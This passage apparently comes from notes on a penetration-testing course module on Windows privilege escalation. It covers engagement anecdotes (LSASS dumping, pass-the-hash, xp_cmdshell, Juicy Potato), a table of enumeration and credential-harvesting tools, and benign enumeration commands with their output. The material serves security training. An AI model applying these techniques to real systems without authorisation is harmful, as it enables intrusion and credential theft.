privileges|Abusing Windows user privileges|\n|Bypassing User Account Control|Abusing weak service/file permissions|\n|Leveraging unpatched kernel exploits|Credential theft|\n|Traffic Capture|and more.|\n\n---\n\n## Scenario 1 - Overcoming Network Restrictions\n\nI once was given the task to escalate privileges on a client-provided system with no internet access and blocked USB ports. Due to network access control in place, I could not plug my attack machine directly into the user network to assist me. During the assessment, I had already found a network flaw in which the printer VLAN was configured to allow outbound communication over ports 80, 443, and 445. I used manual enumeration methods to find a permissions-related flaw that allowed me to escalate privileges and perform a manual memory dump of the `LSASS` process. From here, I was able to mount an SMB share hosted on my attack machine on the printer VLAN and exfil the `LSASS` DMP file. With this file in hand, I used `Mimikatz` offline to retrieve the NTLM password hash for a domain admin, which I could crack offline and use to access a domain controller from the client-provided system.\n\n---\n\n## Scenario 2 - Pillaging Open Shares\n\nDuring another assessment, I found myself in a pretty locked-down environment that was well monitored and without any obvious configuration flaws or vulnerable services/applications in use. I found a wide-open file share, allowing all users to list its contents and download files stored on it. This share was hosting backups of virtual machines in the environment. I was explicitly interested in virtual harddrive files (`.VMDK` and `.VHDX` files). I could access this share from a Windows VM, mount the `.VHDX` virtual hard drive as a local drive and browse the file system. From here, I retrieved the `SYSTEM`, `SAM`, and `SECURITY` registry hives, moved them to my Linux attack box, and extracted the local administrator password hash using the [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) tool. The organization happened to be using a gold image, and the local administrator hash could be used to gain admin access to nearly every Windows system via a pass-the-hash attack.\n\n---\n\n## Scenario 3 - Hunting Credentials and Abusing Account Privileges\n\nIn this final scenario, I was placed in a rather locked-down network with the goal of accessing critical database servers. The client provided me a laptop with a standard domain user account, and I could load tools onto it. I eventually ran the [Snaffler](https://github.com/SnaffCon/Snaffler) tool to hunt file shares for sensitive information. I came across some `.sql` files containing low-privileged database credentials to a database on one of their database servers. I used an MSSQL client locally to connect to the database using the database credentials, enable the [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) stored procedure and gain local command execution. Using this access as a service account, I confirmed that I had the [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged for local privilege escalation. I downloaded a custom compiled version of [Juicy Potato](https://github.com/ohpe/juicy-potato) to the host to assist with privilege escalation, and was able to add a local admin user. Adding a user was not ideal, but my attempts to obtain a beacon/reverse shell did not work. With this access, I was able to remote into the database host and gain complete control of one of the company's clients' databases.\n\n---\n\n## Why does Privilege Escalation Happen?\n\nThere is no one reason why a company's host(s) may fall victim to privilege escalation, but several possible underlying causes exist. Some typical reasons that flaws are introduced and go unnoticed are personnel and budget. Many organizations simply do not have the personnel to properly keep up with patching, vulnerability management, periodic internal assessments (self-assessments), continuous monitoring, and larger, more resource-intensive initiatives. Such initiatives may include workstation and server upgrades, as well as file share audits (to lock down directories and secure/remove sensitive files such as scripts or configuration files containing credentials).\n\n---\n\n## Moving On\n\nThe scenarios above show how an understanding of Windows privilege escalation is crucial for a penetration tester. In the real world, we will rarely be attacking a single host and need to be able to think on our feet. We should be able to find creative ways to escalate privileges and ways to use this access to further our progress towards the goal of the assessment.\n\n---\n\n## Practical Examples\n\nThroughout the module, we will cover examples with accompanying command output, most of which can be reproduced on the target VMs that can be spawned within the relevant sections. You will be provided RDP credentials to interact with the target VMs and complete the section exercises and skills assessments. You can connect from the Pwnbox or your own VM (after downloading a VPN key once a machine spawns) via RDP using [FreeRDP](https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface), [Remmina](https://remmina.org/), or the RDP client of your choice.\n\n#### Connecting via FreeRDP\n\nWe can connect via command line using the command `xfreerdp /v:<target ip> /u:htb-student` and typing in the provided password when prompted. Most sections will provide credentials for the `htb-student` user, but some, depending on the material, will have you RDP with a different user, and alternate credentials will be provided.\n\nIntroduction to Windows Privilege Escalation\n\n```shell-session\ndrxh3kr@htb[/htb]$  xfreerdp /v:10.129.43.36 /u:htb-student\n\n[21:17:27:323] [28158:28159] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state\n[21:17:27:323] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr\n[21:17:27:324] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd\n[21:17:27:324] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr\n[21:17:27:648] [28158:28159] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized\n[21:17:27:672] [28158:28159] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state\n[21:17:27:672] [28158:28159] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state\n[21:17:28:770] [28158:28159] [INFO][com.freerdp.crypto] - creating directory /home/user2/.config/freerdp\n[21:17:28:770] [28158:28159] [INFO][com.freerdp.crypto] - creating directory [/home/user2/.config/freerdp/certs]\n[21:17:28:771] [28158:28159] [INFO][com.freerdp.crypto] - created directory [/home/user2/.config/freerdp/server]\n[21:17:28:794] [28158:28159] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0\n[21:17:28:794] [28158:28159] [WARN][com.freerdp.crypto] - CN = WINLPE-SKILLS1-SRV\n[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @\n[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.43.36:3389) \n[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:\n[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - Common Name (CN):\n[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - \tWINLPE-SKILLS1-SRV\n[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!\nCertificate details for 10.129.43.36:3389 (RDP-Server):\n\tCommon Name: WINLPE-SKILLS1-SRV\n\tSubject:     CN = WINLPE-SKILLS1-SRV\n\tIssuer:      CN = WINLPE-SKILLS1-SRV\n\tThumbprint:  9f:f0:dd:28:f5:6f:83:db:5e:8c:5a:e9:5f:50:a4:50:2d:b3:e7:a7:af:f4:4a:8a:1a:08:f3:cb:46:c3:c3:e8\nThe above X.509 certificate could not be verified, possibly because you do not have\nthe CA certificate in your certificate store, or the certificate has expired.\nPlease look at the OpenSSL documentation on how to add a private CA to the store.\nDo you trust the above certificate? (Y/T/N) y\nPassword: \n```\n\nMany of the module sections require tools such as open-source scripts, precompiled binaries, and exploit PoCs. Where applicable, these can be found in the `C:\\Tools` directory on the target host. Even though most tools are provided, challenge yourself to upload files to the target (using techniques showcased in the [File Transfers module](https://academy.hackthebox.com/course/preview/file-transfers)) and even compile some of the tools on your own using [Visual Studio](https://visualstudio.microsoft.com/downloads/).\n\nHave fun, and don't forget to think outside the box!",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/02-Useful Tools",
    "path": "02_CPTS/17-Windows Privilege Escalation/02-Useful Tools.md",
    "title": "02 Useful Tools",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Useful Tools --- There are many tools available to us to assist with enumerating Windows systems for common and obscure privilege escalation vectors. Below is a list of useful binaries and scripts, ma...",
    "category": "02_CPTS",
    "content": " # Useful Tools\n\n---\n\nThere are many tools available to us to assist with enumerating Windows systems for common and obscure privilege escalation vectors. Below is a list of useful binaries and scripts, many of which we will cover within the coming module sections.\n\n| Tool                                                                                                     | Description                                                                                                                                                                                                                                                                                                               |\n| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| [Seatbelt](https://github.com/GhostPack/Seatbelt)                                                        | C# project for performing a wide variety of local privilege escalation checks                                                                                                                                                                                                                                             |\n| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained [here](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)                                                                                       |\n| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)      | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found                                                                                                                                                         |\n| [SharpUp](https://github.com/GhostPack/SharpUp)                                                          | C# version of PowerUp                                                                                                                                                                                                                                                                                                     |\n| [JAWS](https://github.com/411Hall/JAWS)                                                                  | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0                                                                                                                                                                                                                                  |\n| [SessionGopher](https://github.com/Arvanaghi/SessionGopher)                                              | SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information                                                                                                                         |\n| [Watson](https://github.com/rasta-mouse/Watson)                                                          | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.                                                                                                                                                                                                    |\n| [LaZagne](https://github.com/AlessandroZ/LaZagne)                                                        | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more                                                                             |\n| [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)                        | WES-NG is a tool based on the output of Windows' `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported                 |\n| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)         | We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) |\n\nWe can also find pre-compiled binaries of `Seatbelt` and `SharpUp` [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries), and standalone binaries of `LaZagne` [here](https://github.com/AlessandroZ/LaZagne/releases/). It is recommended that we always compile our tools from the source if using them in a client environment.\n\nNote: Depending on how we gain access to a system we may not have many directories that are writeable by our user to upload tools. It is always a safe bet to upload tools to `C:\\Windows\\Temp` because the `BUILTIN\\Users` group has write access.\n\nThis is not an exhaustive list of tools available to us. Furthermore, we should strive to learn what each tool does if one does not work as expected, or we cannot load them onto the target system. Tools like the ones listed above are extremely useful in narrowing down our checks and focusing our enumeration. Enumerating a Windows system can be a daunting task with an immense amount of information to sift through and make sense of. Tools can make this process faster and also give us more output in an easy-to-read format. A disadvantage to this can be information overload, since some of these tools, such as `winPEAS`, return an incredible amount of information that is mostly not useful to us. Tools can be a double-edged sword. While they help speed up the enumeration process and provide us with highly detailed output, we could be working less efficiently if we do not know how to read the output or narrow it down to the most interesting data points. Tools can also produce false positives, so we must have a deep understanding of many possible privilege escalation techniques to troubleshoot when things go wrong or are not what they seem to be. Learning the enumeration techniques manually will help to ensure that we do not miss obvious flaws due to an issue with a tool, like a false negative or false positive.\n\nThroughout this module, we will show manual enumeration techniques for the various examples we cover and tool output where applicable. Aside from the enumeration techniques, it is also vital to learn how to perform the exploitation steps manually and not rely on \"autopwn\" scripts or tools that we cannot control. It is fine (and encouraged!) to write our own tools/scripts to perform both enumeration and exploitation steps. Still, we should be confident enough in both phases to explain precisely what we are doing to our client at any stage in the process. We should also be able to operate in an environment where we cannot load tools (such as an air-gapped network or systems that do not have internet access or allow us to plug in an external device such as a USB flash drive).\n\nThese tools are not only beneficial for penetration testers but can also assist systems administrators with their jobs by helping to identify low-hanging fruit to fix before an assessment, periodically checking the security posture of a few machines, analyzing the impact of an upgrade or other changes, or performing an in-depth security review on a new gold image before deploying it into production. The tools and methods shown in this module can significantly benefit anyone in charge of systems administration, architecture, or internal security & compliance.\n\nLike with any automation, there can be risks to using these tools. Though rare, performing excessive enumeration could cause system instability or issues with a system (or systems) that are already known to be fragile. Furthermore, these tools are well known, and most (if not all) of them will be detected and blocked by common anti-virus solutions, and most certainly, by more advanced EDR products such as Cylance or Carbon Black. Let's look at the latest release of the `LaZagne` tool at the time of writing version [2.4.3](https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe). Uploading the precompiled binary to Virus Total shows that 47/70 products detect it.\n\n![VirusTotal scan results for lazagne.exe, flagged as malicious by 47 out of 70 security vendors. File details include hash ed2f501408a7a6e1a854c29c4b0bc5648aaa8612432df829008931b3e34bf56, size 6.33 MB, and upload date 2021-06-20. Various detections include Application.Lazagne.H, Malware/Win64.RL_Generic.R297990, and Hacktool.Win32.LaZagne.3!c.](https://academy.hackthebox.com/storage/modules/67/VT_detected2.png)\n\nWe likely would have been caught on the spot if we were attempting to run this during an evasive engagement. During other assessments, we may encounter protections that we need to bypass to run our tools. Though out of scope for this module, we can use a variety of methods to get our tools past common AV products, such as removing comments, changing function names, encrypting the executable, etc. These techniques will be taught in a later module. We will assume that our target client has temporarily set Windows Defender on the hosts we are assessing not to block our activities for this module. They are looking for as many issues as possible and are not looking to test their defenses at this stage in the game.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/03-Situational Awareness",
    "path": "02_CPTS/17-Windows Privilege Escalation/03-Situational Awareness.md",
    "title": "03 Situational Awareness",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Situational Awareness --- When placed in any situation, whether in our day-to-day lives or during a project such as a network penetration test, it is always important to orient ourselves in space and ...",
    "category": "02_CPTS",
    "content": "# Situational Awareness\n\n---\n\nWhen placed in any situation, whether in our day-to-day lives or during a project such as a network penetration test, it is always important to orient ourselves in space and time. We cannot function and react effectively without an understanding of our current surroundings. We require this information to make informed decisions about our next steps to operate proactively instead of reactively. When we land on a Windows or Linux system intending to escalate privileges next, there are several things we should always look for to plan out our next moves. We may find other hosts that we can access directly, protections in place that will need to be bypassed, or find that certain tools will not work against the system in question.\n\n---\n\n## Network Information\n\nGathering network information is a crucial part of our enumeration. We may find that the host is dual-homed and that compromising the host may allow us to move laterally into another part of the network that we could not access previously. Dual-homed means that the host or server belongs to two or more different networks and, in most cases, has several virtual or physical network interfaces. We should always look at [routing tables](https://en.wikipedia.org/wiki/Routing_table) to view information about the local network and networks around it. We can also gather information about the local domain (if the host is part of an Active Directory environment), including the IP addresses of domain controllers. It is also important to use the [arp](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/arp) command to view the ARP cache for each interface and view other hosts the host has recently communicated with. This could help us with lateral movement after obtaining credentials. It could be a good indication of which hosts administrators are connecting to via RDP or WinRM from this host.\n\nThis network information may help directly or indirectly with our local privilege escalation. It may lead us down another path to a system that we can access or escalate privileges on or reveal information that we can use for lateral movement to further our access after escalating privileges on the current system.\n\n#### Interface(s), IP Address(es), DNS Information\n\n\n\n```cmd-session\nC:\\htb> ipconfig /all\n\nWindows IP Configuration\n\n   Host Name . . . . . . . . . . . . : WINLPE-SRV01\n   Primary Dns Suffix  . . . . . . . :\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n   DNS Suffix Search List. . . . . . : .htb\n\nEthernet adapter Ethernet1:\n\n   Connection-specific DNS Suffix  . :\n   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter\n   Physical Address. . . . . . . . . : 00-50-56-B9-C5-4B\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n   Link-local IPv6 Address . . . . . : fe80::f055:fefd:b1b:9919%9(Preferred)\n   IPv4 Address. . . . . . . . . . . : 192.168.20.56(Preferred)\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 192.168.20.1\n   DHCPv6 IAID . . . . . . . . . . . : 151015510\n   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94\n   DNS Servers . . . . . . . . . . . : 8.8.8.8\n   NetBIOS over Tcpip. . . . . . . . : Enabled\n\nEthernet adapter Ethernet0:\n\n   Connection-specific DNS Suffix  . : .htb\n   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection\n   Physical Address. . . . . . . . . : 00-50-56-B9-90-94\n   DHCP Enabled. . . . . . . . . . . : Yes\n   Autoconfiguration Enabled . . . . : Yes\n   IPv6 Address. . . . . . . . . . . : dead:beef::e4db:5ea3:2775:8d4d(Preferred)\n   Link-local IPv6 Address . . . . . : fe80::e4db:5ea3:2775:8d4d%4(Preferred)\n   IPv4 Address. . . . . . . . . . . : 10.129.43.8(Preferred)\n   Subnet Mask . . . . . . . . . . . : 255.255.0.0\n   Lease Obtained. . . . . . . . . . : Thursday, March 25, 2021 9:24:45 AM\n   Lease Expires . . . . . . . . . . : Monday, March 29, 2021 1:28:44 PM\n   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:4ddf%4\n                                       10.129.0.1\n   DHCP Server . . . . . . . . . . . : 10.129.0.1\n   DHCPv6 IAID . . . . . . . . . . . : 50352214\n   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94\n   DNS Servers . . . . . . . . . . . : 1.1.1.1\n                                       8.8.8.8\n   NetBIOS over Tcpip. . . . . . . . : Enabled\n\nTunnel adapter isatap..htb:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : .htb\n   Description . . . . . . . . . . . : Microsoft ISATAP Adapter\n   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n\nTunnel adapter Teredo Tunneling Pseudo-Interface:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . :\n   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface\n   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n\nTunnel adapter isatap.{02D6F04C-A625-49D1-A85D-4FB454FBB3DB}:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . :\n   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2\n   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n```\n\n#### ARP Table\n\n\n\n```cmd-session\nC:\\htb> arp -a\n\nInterface: 10.129.43.8 --- 0x4\n  Internet Address      Physical Address      Type\n  10.129.0.1            00-50-56-b9-4d-df     dynamic\n  10.129.43.12          00-50-56-b9-da-ad     dynamic\n  10.129.43.13          00-50-56-b9-5b-9f     dynamic\n  10.129.255.255        ff-ff-ff-ff-ff-ff     static\n  224.0.0.22            01-00-5e-00-00-16     static\n  224.0.0.252           01-00-5e-00-00-fc     static\n  224.0.0.253           01-00-5e-00-00-fd     static\n  239.255.255.250       01-00-5e-7f-ff-fa     static\n  255.255.255.255       ff-ff-ff-ff-ff-ff     static\n\nInterface: 192.168.20.56 --- 0x9\n  Internet Address      Physical Address      Type\n  192.168.20.255        ff-ff-ff-ff-ff-ff     static\n  224.0.0.22            01-00-5e-00-00-16     static\n  224.0.0.252           01-00-5e-00-00-fc     static\n  239.255.255.250       01-00-5e-7f-ff-fa     static\n  255.255.255.255       ff-ff-ff-ff-ff-ff     static\n```\n\n#### Routing Table\n\n\n\n```cmd-session\nC:\\htb> route print\n\n===========================================================================\nInterface List\n  9...00 50 56 b9 c5 4b ......vmxnet3 Ethernet Adapter\n  4...00 50 56 b9 90 94 ......Intel(R) 82574L Gigabit Network Connection\n  1...........................Software Loopback Interface 1\n  3...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter\n  5...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface\n 13...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2\n===========================================================================\n\nIPv4 Route Table\n===========================================================================\nActive Routes:\nNetwork Destination        Netmask          Gateway       Interface  Metric\n          0.0.0.0          0.0.0.0       10.129.0.1      10.129.43.8     25\n          0.0.0.0          0.0.0.0     192.168.20.1    192.168.20.56    271\n       10.129.0.0      255.255.0.0         On-link       10.129.43.8    281\n      10.129.43.8  255.255.255.255         On-link       10.129.43.8    281\n   10.129.255.255  255.255.255.255         On-link       10.129.43.8    281\n        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331\n        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331\n  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331\n     192.168.20.0    255.255.255.0         On-link     192.168.20.56    271\n    192.168.20.56  255.255.255.255         On-link     192.168.20.56    271\n   192.168.20.255  255.255.255.255         On-link     192.168.20.56    271\n        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331\n        224.0.0.0        240.0.0.0         On-link       10.129.43.8    281\n        224.0.0.0        240.0.0.0         On-link     192.168.20.56    271\n  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331\n  255.255.255.255  255.255.255.255         On-link       10.129.43.8    281\n  255.255.255.255  255.255.255.255         On-link     192.168.20.56    271\n===========================================================================\nPersistent Routes:\n  Network Address          Netmask  Gateway Address  Metric\n          0.0.0.0          0.0.0.0     192.168.20.1  Default\n===========================================================================\n\nIPv6 Route Table\n===========================================================================\nActive Routes:\n If Metric Network Destination      Gateway\n  4    281 ::/0                     fe80::250:56ff:feb9:4ddf\n  1    331 ::1/128                  On-link\n  4    281 dead:beef::/64           On-link\n  4    281 dead:beef::e4db:5ea3:2775:8d4d/128\n                                    On-link\n  4    281 fe80::/64                On-link\n  9    271 fe80::/64                On-link\n  4    281 fe80::e4db:5ea3:2775:8d4d/128\n                                    On-link\n  9    271 fe80::f055:fefd:b1b:9919/128\n                                    On-link\n  1    331 ff00::/8                 On-link\n  4    281 ff00::/8                 On-link\n  9    271 ff00::/8                 On-link\n===========================================================================\nPersistent Routes:\n  None\n```\n\n---\n\n## Enumerating Protections\n\nMost modern environments have some sort of anti-virus or Endpoint Detection and Response (EDR) service running to monitor, alert on, and block threats proactively. These tools may interfere with the enumeration process. They will very likely present some sort of challenge during the privilege escalation process, especially if we are using some kind of public PoC exploit or tool. Enumerating protections in place will help us ensure that we are using methods that are not being blocked or detected and will help us if we have to craft custom payloads or modify tools before compiling them.\n\nMany organizations utilize some sort of application whitelisting solution to control what types of applications and files certain users can run. This may be used to attempt to block non-admin users from running `cmd.exe` or `powershell.exe` or other binaries and file types not needed for their day-to-day work. A popular solution offered by Microsoft is [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview). We can use the [GetAppLockerPolicy](https://docs.microsoft.com/en-us/powershell/module/applocker/get-applockerpolicy?view=windowsserver2019-ps) cmdlet to enumerate the local, effective (enforced), and domain AppLocker policies. This will help us see what binaries or file types may be blocked and whether we will have to perform some sort of AppLocker bypass either during our enumeration or before running a tool or technique to escalate privileges.\n\nIn a real-world engagement, the client will likely have protections in place that detect the most common tools/scripts (including those introduced in the previous section). There are ways to deal with these, and enumerating the protections in use can help us modify our tools in a lab environment and test them before using them against a client system. Some EDR tools detect on or even block usage of common binaries such as `net.exe`, `tasklist`, etc. Organizations may restrict what binaries a user can run or immediately flag suspicious activities, such as an accountant's machine showing specific binaries being run via cmd.exe. Early enumeration and a deep understanding of the client's environment and workarounds against common AV and EDR solutions can save us time during a non-evasive engagement and make or break an evasive engagement.\n\n#### Check Windows Defender Status\n\nSituational Awareness\n\n```powershell-session\nPS C:\\htb> Get-MpComputerStatus\n\nAMEngineVersion                 : 1.1.17900.7\nAMProductVersion                : 4.10.14393.2248\nAMServiceEnabled                : True\nAMServiceVersion                : 4.10.14393.2248\nAntispywareEnabled              : True\nAntispywareSignatureAge         : 1\nAntispywareSignatureLastUpdated : 3/28/2021 2:59:13 AM\nAntispywareSignatureVersion     : 1.333.1470.0\nAntivirusEnabled                : True\nAntivirusSignatureAge           : 1\nAntivirusSignatureLastUpdated   : 3/28/2021 2:59:12 AM\nAntivirusSignatureVersion       : 1.333.1470.0\nBehaviorMonitorEnabled          : False\nComputerID                      : 54AF7DE4-3C7E-4DA0-87AC-831B045B9063\nComputerState                   : 0\nFullScanAge                     : 4294967295\nFullScanEndTime                 :\nFullScanStartTime               :\nIoavProtectionEnabled           : False\nLastFullScanSource              : 0\nLastQuickScanSource             : 0\nNISEnabled                      : False\nNISEngineVersion                : 0.0.0.0\nNISSignatureAge                 : 4294967295\nNISSignatureLastUpdated         :\nNISSignatureVersion             : 0.0.0.0\nOnAccessProtectionEnabled       : False\nQuickScanAge                    : 4294967295\nQuickScanEndTime                :\nQuickScanStartTime              :\nRealTimeProtectionEnabled       : False\nRealTimeScanDirection           : 0\nPSComputerName                  :\n```\n\n#### List AppLocker Rules\n\nSituational Awareness\n\n```powershell-session\nPS C:\\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n\nPublisherConditions : {*\\*\\*,0.0.0.0-*}\nPublisherExceptions : {}\nPathExceptions      : {}\nHashExceptions      : {}\nId                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba\nName                : (Default Rule) All signed packaged apps\nDescription         : Allows members of the Everyone group to run packaged apps that are signed.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {%PROGRAMFILES%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 921cc481-6e17-4653-8f75-050b80acca20\nName                : (Default Rule) All files located in the Program Files folder\nDescription         : Allows members of the Everyone group to run applications that are located in the Program Files\n                      folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {%WINDIR%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51\nName                : (Default Rule) All files located in the Windows folder\nDescription         : Allows members of the Everyone group to run applications that are located in the Windows folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : fd686d83-a829-4351-8ff4-27c7de5755d2\nName                : (Default Rule) All files\nDescription         : Allows members of the local Administrators group to run all applications.\nUserOrGroupSid      : S-1-5-32-544\nAction              : Allow\n\nPublisherConditions : {*\\*\\*,0.0.0.0-*}\nPublisherExceptions : {}\nPathExceptions      : {}\nHashExceptions      : {}\nId                  : b7af7102-efde-4369-8a89-7a6a392d1473\nName                : (Default Rule) All digitally signed Windows Installer files\nDescription         : Allows members of the Everyone group to run digitally signed Windows Installer files.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {%WINDIR%\\Installer\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 5b290184-345a-4453-b184-45305f6d9a54\nName                : (Default Rule) All Windows Installer files in %systemdrive%\\Windows\\Installer\nDescription         : Allows members of the Everyone group to run all Windows Installer files located in\n                      %systemdrive%\\Windows\\Installer.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {*.*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d\nName                : (Default Rule) All Windows Installer files\nDescription         : Allows members of the local Administrators group to run all Windows Installer files.\nUserOrGroupSid      : S-1-5-32-544\nAction              : Allow\n\nPathConditions      : {%PROGRAMFILES%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 06dce67b-934c-454f-a263-2515c8796a5d\nName                : (Default Rule) All scripts located in the Program Files folder\nDescription         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {%WINDIR%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c\nName                : (Default Rule) All scripts located in the Windows folder\nDescription         : Allows members of the Everyone group to run scripts that are located in the Windows folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : ed97d0cb-15ff-430f-b82c-8d7832957725\nName                : (Default Rule) All scripts\nDescription         : Allows members of the local Administrators group to run all scripts.\nUserOrGroupSid      : S-1-5-32-544\nAction              : Allow\n```\n\n#### Test AppLocker Policy\n\nSituational Awareness\n\n```powershell-session\nPS C:\\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\\Windows\\System32\\cmd.exe -User Everyone\n\nFilePath                    PolicyDecision MatchingRule\n--------                    -------------- ------------\nC:\\Windows\\System32\\cmd.exe         Denied c:\\windows\\system32\\cmd.exe\n```\n\n---\n\n## Next Steps\n\nNow that we have gathered network information about the host and enumerated any protections in place, we can decide which tools or manual techniques to use in the subsequent enumeration phases and any additional possible 